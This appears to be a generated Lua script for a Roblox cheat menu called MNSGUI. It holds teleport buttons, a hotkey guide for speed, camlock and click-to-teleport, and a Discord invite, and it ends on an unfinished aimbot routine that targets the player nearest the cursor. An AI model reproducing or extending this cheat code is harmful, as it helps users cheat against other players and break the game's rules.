G2L["45"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["45"]["TextSize"] = 11;
G2L["45"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["45"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["45"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["45"]["Name"] = [[hoodkicks]];
G2L["45"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["45"]["Text"] = [[hood kicks]];
G2L["45"]["Position"] = UDim2.new(0.67083, 0, 0.23407, 0);


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.Frame.uphill
G2L["46"] = Instance.new("TextButton", G2L["40"]);
G2L["46"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["46"]["TextSize"] = 11;
G2L["46"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["46"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["46"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["46"]["Name"] = [[uphill]];
G2L["46"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["46"]["Text"] = [[up hill]];
G2L["46"]["Position"] = UDim2.new(0.67083, 0, 0.40619, 0);


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.Frame.school
G2L["47"] = Instance.new("TextButton", G2L["40"]);
G2L["47"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["TextSize"] = 11;
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["47"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["47"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["47"]["Name"] = [[school]];
G2L["47"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["47"]["Text"] = [[school]];
G2L["47"]["Position"] = UDim2.new(0.01875, 0, 0.57832, 0);


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.Frame.hairsalon
G2L["48"] = Instance.new("TextButton", G2L["40"]);
G2L["48"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["48"]["TextSize"] = 11;
G2L["48"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["48"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["48"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["48"]["Name"] = [[hairsalon]];
G2L["48"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["48"]["Text"] = [[hair salon]];
G2L["48"]["Position"] = UDim2.new(0.34479, 0, 0.57832, 0);


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.Frame.gym
G2L["49"] = Instance.new("TextButton", G2L["40"]);
G2L["49"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["49"]["TextSize"] = 11;
G2L["49"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["49"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["49"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["49"]["Name"] = [[gym]];
G2L["49"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["49"]["Text"] = [[gym]];
G2L["49"]["Position"] = UDim2.new(0.34479, 0, 0.23407, 0);


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.Frame.mil
G2L["4a"] = Instance.new("TextButton", G2L["40"]);
G2L["4a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["TextSize"] = 11;
G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4a"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["4a"]["Name"] = [[mil]];
G2L["4a"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["4a"]["Text"] = [[military]];
G2L["4a"]["Position"] = UDim2.new(0.34479, 0, 0.40619, 0);


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.Frame.LocalScript
G2L["4b"] = Instance.new("LocalScript", G2L["40"]);



-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.Frame.bank
G2L["4c"] = Instance.new("TextButton", G2L["40"]);
G2L["4c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4c"]["TextSize"] = 11;
G2L["4c"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["4c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4c"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["4c"]["Name"] = [[bank]];
G2L["4c"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["4c"]["Text"] = [[bank]];
G2L["4c"]["Position"] = UDim2.new(0.01875, 0, 0.06195, 0);


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.Frame.downhill
G2L["4d"] = Instance.new("TextButton", G2L["40"]);
G2L["4d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d"]["TextSize"] = 11;
G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["4d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4d"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["4d"]["Name"] = [[downhill]];
G2L["4d"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["4d"]["Text"] = [[down hill]];
G2L["4d"]["Position"] = UDim2.new(0, 0, 1.62603, 0);


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.Frame.food
G2L["4e"] = Instance.new("TextButton", G2L["40"]);
G2L["4e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e"]["TextSize"] = 11;
G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["4e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4e"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["4e"]["Name"] = [[food]];
G2L["4e"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["4e"]["Text"] = [[food]];
G2L["4e"]["Position"] = UDim2.new(0.01875, 0, 0.75044, 0);


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.Frame.UIGridLayout
G2L["4f"] = Instance.new("UIGridLayout", G2L["40"]);
G2L["4f"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["4f"]["CellSize"] = UDim2.new(1, 0, 0.06, 0);
G2L["4f"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["4f"]["CellPadding"] = UDim2.new(0, 7, 0, 5);


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.2
G2L["50"] = Instance.new("TextLabel", G2L["3f"]);
G2L["50"]["BorderSizePixel"] = 0;
G2L["50"]["TextSize"] = 9;
G2L["50"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["50"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["50"]["BackgroundTransparency"] = 1;
G2L["50"]["Size"] = UDim2.new(0.16072, 0, -0.01425, 23);
G2L["50"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50"]["Text"] = [[TELEPORTATION]];
G2L["50"]["Name"] = [[2]];
G2L["50"]["Position"] = UDim2.new(0.41437, 0, -0.00176, 0);


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.tpPlr
G2L["51"] = Instance.new("Frame", G2L["3f"]);
G2L["51"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["51"]["Size"] = UDim2.new(0, 160, 0, 119);
G2L["51"]["Position"] = UDim2.new(0.28934, 0, 0.72944, 0);
G2L["51"]["BorderColor3"] = Color3.fromRGB(131, 113, 132);
G2L["51"]["Name"] = [[tpPlr]];


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.tpPlr.UIListLayout
G2L["52"] = Instance.new("UIListLayout", G2L["51"]);
G2L["52"]["VerticalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["52"]["Padding"] = UDim.new(0, 5);
G2L["52"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["52"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.tpPlr.plrName
G2L["53"] = Instance.new("TextBox", G2L["51"]);
G2L["53"]["Name"] = [[plrName]];
G2L["53"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["53"]["PlaceholderColor3"] = Color3.fromRGB(86, 74, 87);
G2L["53"]["TextSize"] = 9;
G2L["53"]["TextColor3"] = Color3.fromRGB(164, 140, 165);
G2L["53"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["53"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["53"]["PlaceholderText"] = [[Enter Player Name]];
G2L["53"]["Size"] = UDim2.new(1, 0, 0, 25);
G2L["53"]["Position"] = UDim2.new(0, 0, 0.00959, 0);
G2L["53"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["53"]["Text"] = [[]];


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.tpPlr.plrName.UIPadding
G2L["54"] = Instance.new("UIPadding", G2L["53"]);
G2L["54"]["PaddingTop"] = UDim.new(0, 5);
G2L["54"]["PaddingRight"] = UDim.new(0, 10);
G2L["54"]["PaddingLeft"] = UDim.new(0, 10);
G2L["54"]["PaddingBottom"] = UDim.new(0, 5);


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.tpPlr.tp
G2L["55"] = Instance.new("TextButton", G2L["51"]);
G2L["55"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["55"]["TextSize"] = 12;
G2L["55"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["55"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["55"]["Size"] = UDim2.new(1, 0, -0.0122, 24);
G2L["55"]["Name"] = [[tp]];
G2L["55"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["55"]["Text"] = [[TELEPORT]];
G2L["55"]["Position"] = UDim2.new(-0.01137, 0, 0.84374, 0);


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.tpPlr.UIPadding
G2L["56"] = Instance.new("UIPadding", G2L["51"]);
G2L["56"]["PaddingTop"] = UDim.new(0, 10);
G2L["56"]["PaddingRight"] = UDim.new(0, 10);
G2L["56"]["PaddingLeft"] = UDim.new(0, 10);
G2L["56"]["PaddingBottom"] = UDim.new(0, 10);


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.tpPlr.3text
G2L["57"] = Instance.new("TextLabel", G2L["51"]);
G2L["57"]["TextWrapped"] = true;
G2L["57"]["BorderSizePixel"] = 0;
G2L["57"]["TextSize"] = 12;
G2L["57"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["57"]["TextScaled"] = true;
G2L["57"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["57"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["57"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["57"]["BackgroundTransparency"] = 1;
G2L["57"]["Size"] = UDim2.new(1, 0, -0.01503, 23);
G2L["57"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["57"]["Text"] = [[TELEPORTS TO PLAYER LOCATION]];
G2L["57"]["Name"] = [[3text]];


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.tpPlr.LocalScript
G2L["58"] = Instance.new("LocalScript", G2L["51"]);



-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.tpPlr.LocalScript
G2L["59"] = Instance.new("LocalScript", G2L["51"]);



-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.UIPadding
G2L["5a"] = Instance.new("UIPadding", G2L["3e"]);
G2L["5a"]["PaddingTop"] = UDim.new(0, 10);
G2L["5a"]["PaddingRight"] = UDim.new(0, 10);
G2L["5a"]["PaddingLeft"] = UDim.new(0, 10);
G2L["5a"]["PaddingBottom"] = UDim.new(0, 10);


-- StarterGui.MNSGUI.MainNitroFrame.1
G2L["5b"] = Instance.new("TextLabel", G2L["2"]);
G2L["5b"]["BorderSizePixel"] = 0;
G2L["5b"]["TextSize"] = 12;
G2L["5b"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["5b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5b"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5b"]["TextColor3"] = Color3.fromRGB(164, 140, 165);
G2L["5b"]["BackgroundTransparency"] = 1;
G2L["5b"]["Size"] = UDim2.new(0.47754, 0, 0.0127, 23);
G2L["5b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5b"]["Text"] = [[KEY : RSHIFT (FOR MENU)]];
G2L["5b"]["Name"] = [[1]];
G2L["5b"]["Position"] = UDim2.new(0.487, 0, -0, 0);


-- StarterGui.MNSGUI.MainNitroFrame.GuideFrame
G2L["5c"] = Instance.new("Frame", G2L["2"]);
G2L["5c"]["BorderSizePixel"] = 0;
G2L["5c"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["5c"]["Size"] = UDim2.new(0, 422, 0, 484);
G2L["5c"]["Position"] = UDim2.new(0, 0, 0.11096, 0);
G2L["5c"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["5c"]["Name"] = [[GuideFrame]];


-- StarterGui.MNSGUI.MainNitroFrame.GuideFrame.UIPadding
G2L["5d"] = Instance.new("UIPadding", G2L["5c"]);
G2L["5d"]["PaddingTop"] = UDim.new(0, 10);
G2L["5d"]["PaddingRight"] = UDim.new(0, 10);
G2L["5d"]["PaddingLeft"] = UDim.new(0, 10);
G2L["5d"]["PaddingBottom"] = UDim.new(0, 10);


-- StarterGui.MNSGUI.MainNitroFrame.GuideFrame.GuideFrame
G2L["5e"] = Instance.new("Frame", G2L["5c"]);
G2L["5e"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["5e"]["Size"] = UDim2.new(0, 394, 0, 462);
G2L["5e"]["Position"] = UDim2.new(0.01, 0, -0.001, 0);
G2L["5e"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["5e"]["Name"] = [[GuideFrame]];
G2L["5e"]["LayoutOrder"] = 1;


-- StarterGui.MNSGUI.MainNitroFrame.GuideFrame.GuideFrame.2
G2L["5f"] = Instance.new("TextLabel", G2L["5e"]);
G2L["5f"]["BorderSizePixel"] = 0;
G2L["5f"]["TextSize"] = 9;
G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5f"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5f"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["5f"]["BackgroundTransparency"] = 1;
G2L["5f"]["Size"] = UDim2.new(0.16072, 0, -0.01425, 23);
G2L["5f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5f"]["Text"] = [[GUIDE]];
G2L["5f"]["Name"] = [[2]];
G2L["5f"]["Position"] = UDim2.new(0.41437, 0, -0.00176, 0);


-- StarterGui.MNSGUI.MainNitroFrame.GuideFrame.GuideFrame.6
G2L["60"] = Instance.new("TextLabel", G2L["5e"]);
G2L["60"]["BorderSizePixel"] = 0;
G2L["60"]["TextSize"] = 13;
G2L["60"]["TextStrokeColor3"] = Color3.fromRGB(131, 113, 132);
G2L["60"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["60"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["60"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["60"]["BackgroundTransparency"] = 1;
G2L["60"]["Size"] = UDim2.new(0.71437, 0, 0.0097, 23);
G2L["60"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["60"]["Text"] = [[SPEED : Z (FOR OLD AND NEW)]];
G2L["60"]["Name"] = [[6]];
G2L["60"]["Position"] = UDim2.new(0.14378, 0, 0.05454, 0);


-- StarterGui.MNSGUI.MainNitroFrame.GuideFrame.GuideFrame.6
G2L["61"] = Instance.new("TextLabel", G2L["5e"]);
G2L["61"]["BorderSizePixel"] = 0;
G2L["61"]["TextSize"] = 13;
G2L["61"]["TextStrokeColor3"] = Color3.fromRGB(131, 113, 132);
G2L["61"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["61"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["61"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["61"]["BackgroundTransparency"] = 1;
G2L["61"]["Size"] = UDim2.new(0.71437, 0, 0.0097, 23);
G2L["61"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["61"]["Text"] = [[CAMLOCK : C ]];
G2L["61"]["Name"] = [[6]];
G2L["61"]["Position"] = UDim2.new(0.14632, 0, 0.11298, 0);


-- StarterGui.MNSGUI.MainNitroFrame.GuideFrame.GuideFrame.6
G2L["62"] = Instance.new("TextLabel", G2L["5e"]);
G2L["62"]["BorderSizePixel"] = 0;
G2L["62"]["TextSize"] = 13;
G2L["62"]["TextStrokeColor3"] = Color3.fromRGB(131, 113, 132);
G2L["62"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["62"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["62"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["62"]["BackgroundTransparency"] = 1;
G2L["62"]["Size"] = UDim2.new(0.71437, 0, 0.0097, 23);
G2L["62"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["62"]["Text"] = [[CLICK TO TP : CTRL + LEFT CLICK]];
G2L["62"]["Name"] = [[6]];
G2L["62"]["Position"] = UDim2.new(0.14632, 0, 0.17142, 0);


-- StarterGui.MNSGUI.MainNitroFrame.GuideFrame.GuideFrame.6
G2L["63"] = Instance.new("TextLabel", G2L["5e"]);
G2L["63"]["BorderSizePixel"] = 0;
G2L["63"]["TextSize"] = 13;
G2L["63"]["TextStrokeColor3"] = Color3.fromRGB(131, 113, 132);
G2L["63"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["63"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["63"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["63"]["BackgroundTransparency"] = 1;
G2L["63"]["Size"] = UDim2.new(0.71437, 0, 0.0097, 23);
G2L["63"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["63"]["Text"] = [[CREDS :]];
G2L["63"]["Name"] = [[6]];
G2L["63"]["Position"] = UDim2.new(0.14632, 0, 0.31645, 0);


-- StarterGui.MNSGUI.MainNitroFrame.GuideFrame.GuideFrame.6
G2L["64"] = Instance.new("TextLabel", G2L["5e"]);
G2L["64"]["BorderSizePixel"] = 0;
G2L["64"]["TextSize"] = 13;
G2L["64"]["TextStrokeColor3"] = Color3.fromRGB(131, 113, 132);
G2L["64"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["64"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["64"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["64"]["BackgroundTransparency"] = 1;
G2L["64"]["Size"] = UDim2.new(0.71437, 0, 0.0097, 23);
G2L["64"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["64"]["Text"] = [[UI & CODING : CRUEL, VIVID]];
G2L["64"]["Name"] = [[6]];
G2L["64"]["Position"] = UDim2.new(0.14632, 0, 0.37705, 0);


-- StarterGui.MNSGUI.MainNitroFrame.GuideFrame.GuideFrame.6
G2L["65"] = Instance.new("TextLabel", G2L["5e"]);
G2L["65"]["BorderSizePixel"] = 0;
G2L["65"]["TextSize"] = 13;
G2L["65"]["TextStrokeColor3"] = Color3.fromRGB(131, 113, 132);
G2L["65"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["65"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["65"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["65"]["BackgroundTransparency"] = 1;
G2L["65"]["Size"] = UDim2.new(0.71437, 0, 0.0097, 23);
G2L["65"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["65"]["Text"] = [[GUNCHAMS : CORE]];
G2L["65"]["Name"] = [[6]];
G2L["65"]["Position"] = UDim2.new(0.14632, 0, 0.43766, 0);


-- StarterGui.MNSGUI.MainNitroFrame.GuideFrame.GuideFrame.6
G2L["66"] = Instance.new("TextLabel", G2L["5e"]);
G2L["66"]["BorderSizePixel"] = 0;
G2L["66"]["TextSize"] = 13;
G2L["66"]["TextStrokeColor3"] = Color3.fromRGB(131, 113, 132);
G2L["66"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["66"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["66"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["66"]["BackgroundTransparency"] = 1;
G2L["66"]["Size"] = UDim2.new(0.71437, 0, 0.0097, 23);
G2L["66"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["66"]["Text"] = [[W PERSON : KRYPTON FOR HELPING US WITH BOOSTS]];
G2L["66"]["Name"] = [[6]];
G2L["66"]["Position"] = UDim2.new(0.14632, 0, 0.50259, 0);


-- StarterGui.MNSGUI.MainNitroFrame.GuideFrame.GuideFrame.6
G2L["67"] = Instance.new("TextLabel", G2L["5e"]);
G2L["67"]["BorderSizePixel"] = 0;
G2L["67"]["TextSize"] = 22;
G2L["67"]["TextStrokeColor3"] = Color3.fromRGB(131, 113, 132);
G2L["67"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["67"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["67"]["TextColor3"] = Color3.fromRGB(86, 86, 255);
G2L["67"]["BackgroundTransparency"] = 1;
G2L["67"]["Size"] = UDim2.new(0.71437, 0, 0.0097, 23);
G2L["67"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["67"]["Text"] = [[DISCORD.GG/GETNITROGEN]];
G2L["67"]["Name"] = [[6]];
G2L["67"]["Position"] = UDim2.new(0.14378, 0, 0.758, 0);


-- StarterGui.MNSGUI.MainNitroFrame.GuideFrame.GuideFrame.6
G2L["68"] = Instance.new("TextLabel", G2L["5e"]);
G2L["68"]["BorderSizePixel"] = 0;
G2L["68"]["TextSize"] = 13;
G2L["68"]["TextStrokeColor3"] = Color3.fromRGB(131, 113, 132);
G2L["68"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["68"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["68"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["68"]["BackgroundTransparency"] = 1;
G2L["68"]["Size"] = UDim2.new(0.71437, 0, 0.0097, 23);
G2L["68"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["68"]["Text"] = [[FLY COMING SOON!!!]];
G2L["68"]["Name"] = [[6]];
G2L["68"]["Position"] = UDim2.new(0.13617, 0, 0.22987, 0);


-- StarterGui.MNSGUI.MainNitroFrame.GuideFrame.GuideFrame.6
G2L["69"] = Instance.new("TextLabel", G2L["5e"]);
G2L["69"]["BorderSizePixel"] = 0;
G2L["69"]["TextSize"] = 13;
G2L["69"]["TextStrokeColor3"] = Color3.fromRGB(131, 113, 132);
G2L["69"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["69"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["69"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["69"]["BackgroundTransparency"] = 1;
G2L["69"]["Size"] = UDim2.new(0.71437, 0, 0.0097, 23);
G2L["69"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["69"]["Text"] = [[W PERSON : CHAINS FOR MISC HELP]];
G2L["69"]["Name"] = [[6]];
G2L["69"]["Position"] = UDim2.new(0.14632, 0, 0.56103, 0);


-- StarterGui.MNSGUI.MainNitroFrame.TabHolder.LocalScript
local function C_8()
local script = G2L["8"];
	local TweenService = game:GetService("TweenService")
	local frames = script.Parent.Parent
	local tp = frames.PlayerlistFrame
	local main = frames.MainFrame
	local guide = frames.GuideFrame
	
	tp.Visible = false
	main.Visible = false
	guide.Visible = true
	
	local tabHolder = script.Parent
	local playersButton = tabHolder.PlayersButton
	local guideBtn = tabHolder.HowToUse
	local mainButton = tabHolder.MainButton
	
	local defaultColor = Color3.fromRGB(255, 255, 255)
	local selectedColor = Color3.fromRGB(164, 140, 165)
	
	local function fadeButtonColor(button, targetColor)
		local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local goal = {TextColor3 = targetColor}
		local tween = TweenService:Create(button, tweenInfo, goal)
		tween:Play()
	end
	
	local function updateButtonColors(selectedButton)
		fadeButtonColor(playersButton, defaultColor)
	end
	
	mainButton.MouseButton1Click:Connect(function()
		updateButtonColors(mainButton)
		main.Visible = true
		tp.Visible = false
		guide.Visible = false
	end)
	
	
	playersButton.MouseButton1Click:Connect(function()
		updateButtonColors(playersButton)
		main.Visible = false
		tp.Visible = true
		guide.Visible = false
	end)
	guideBtn.MouseButton1Click:Connect(function()
		main.Visible = false
		tp.Visible = false
		guide.Visible = true
	end)
	
	
	
end;
task.spawn(C_8);
-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopLeft.CamlockToggle.LocalScript
local function C_d()
local script = G2L["d"];
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local CurrentCamera = game:GetService("Workspace").CurrentCamera
	local UserInputService = game:GetService("UserInputService")
	local RunService = game:GetService("RunService")
	
	-- Debugging checks
	if typeof(RunService) ~= "Instance" then
		error("RunService is not a valid instance!")
	end
	
	if typeof(CurrentCamera.CFrame.Lerp) ~= "function" then
		error("CFrame:Lerp has been overwritten or is not a function!")
	end
	
	local HUMANOID_ROOT_PART = "HumanoidRootPart"
	local HUMANOID = "Humanoid"
	local HEAD = "Head"
	
	local AimbotTABLE = {
		Enabled = false,
		Radius = 200,
		HitPart = HUMANOID_ROOT_PART,
		Smoothing = 1,
		Target = nil
	}
	
	local button = script.Parent
	local isToggled = false
	button.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
	
	local function toggleButton()
		isToggled = not isToggled  
	
		if isToggled then
			button.BackgroundColor3 = Color3.fromRGB(164, 140, 165)  
			AimbotTABLE.Enabled = true
			AimbotTABLE.Target = nil
		else
			button.BackgroundColor3 = Color3.fromRGB(31, 31, 31)  
			AimbotTABLE.Enabled = false
			AimbotTABLE.Target = nil
		end
	
	end
	
	button.MouseButton1Click:Connect(toggleButton)
	
	local function IsAlive(Player)
		if Player and Player.Character and Player.Character:FindFirstChild(HUMANOID_ROOT_PART) and Player.Character:FindFirstChild(HUMANOID) and Player.Character[HUMANOID].Health > 0 then
			return true
		end
		return false
	end
	
	local function GetClosestToMouse()
		local Closest, Part = AimbotTABLE.Radius, nil
	
		for _, Player in Players:GetPlayers() do
			if Player ~= LocalPlayer and IsAlive(Player) then
				local HitPart = Player.Character:FindFirstChild(AimbotTABLE.HitPart)
	
				if HitPart then
					local ScreenPosition, OnScreen = CurrentCamera:WorldToViewportPoint(HitPart.Position)
					local Distance = (UserInputService:GetMouseLocation() - Vector2.new(ScreenPosition.X, ScreenPosition.Y)).Magnitude
	
					if OnScreen and Distance <= Closest then
						Closest = Distance
						Part = HitPart
					end
				end
			end
		end
	
		return Part
	end
	
